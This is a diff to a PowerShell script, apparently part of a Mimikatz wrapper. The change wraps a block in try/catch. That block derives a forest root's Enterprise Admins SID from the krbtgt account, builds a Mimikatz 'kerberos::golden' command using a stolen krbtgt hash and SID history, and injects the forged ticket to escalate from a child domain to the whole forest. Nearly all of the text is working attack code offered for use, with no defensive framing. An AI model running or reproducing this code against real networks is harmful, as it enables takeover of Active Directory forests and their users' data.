@@ -2751,22 +2751,26 @@ $RemoteScriptBlock = {
                         $ChildAdminName = ((New-Object System.Security.Principal.SecurityIdentifier($ChildSid+"-500")).Translate( [System.Security.Principal.NTAccount]).Value -split '\\')[1]
                         Write-Verbose "Child -500 administrator name: $ChildAdminName"
 
-                        # get the name of the root domain in the forest
-                        $DomainRootName = ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
-                        Write-Verbose "Root domain name: $DomainRootName"
-                        
-                        # translate the DomainRootName\krbtgt account to get the SID of the parent
-                        #   so we can build the proper enterprise admins sid
-                        $parts = (New-Object System.Security.Principal.NTAccount($DomainRootName,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value -split "-"
-                        $RootSid = ( $parts[0..$($parts.count-2)] ) -join "-"
-                        $RootEASid = $RootSid + "-519"
-                        Write-Verbose "Root EA sid: $RootEASid"
+                        try {
+                            # get the name of the root domain in the forest
+                            $DomainRootName = ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
+                            Write-Verbose "Root domain name: $DomainRootName"
+                            
+                            # translate the DomainRootName\krbtgt account to get the SID of the parent
+                            #   so we can build the proper enterprise admins sid
+                            $parts = (New-Object System.Security.Principal.NTAccount($DomainRootName,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value -split "-"
+                            $RootSid = ( $parts[0..$($parts.count-2)] ) -join "-"
+                            $RootEASid = $RootSid + "-519"
+                            Write-Verbose "Root EA sid: $RootEASid"
 
-                        # build the golden ticket and inject it
-                        $GoldenCMD = "`"kerberos::golden /user:$ChildAdminName /krbtgt:$KrbtgtHash /domain:$($ENV:UserDNSDomain) /sid:$ChildSID /sids:$RootEASid /ptt`""
-                        Write-Verbose "Running golden ticket dommand: $GoldenCMD"
-                        
-                        $results = Invoke-MimikatzCmd $GoldenCMD
+                            # build the golden ticket and inject it
+                            $GoldenCMD = "`"kerberos::golden /user:$ChildAdminName /krbtgt:$KrbtgtHash /domain:$($ENV:UserDNSDomain) /sid:$ChildSID /sids:$RootEASid /ptt`""
+                            Write-Verbose "Running golden ticket dommand: $GoldenCMD"
+                            
+                            $results = Invoke-MimikatzCmd $GoldenCMD
+                        }
+                        catch { }
+
                         if ($results -like "*successfully submitted*") {
 
                             Write-Output "[*] Success: golden ticket submitted for child"
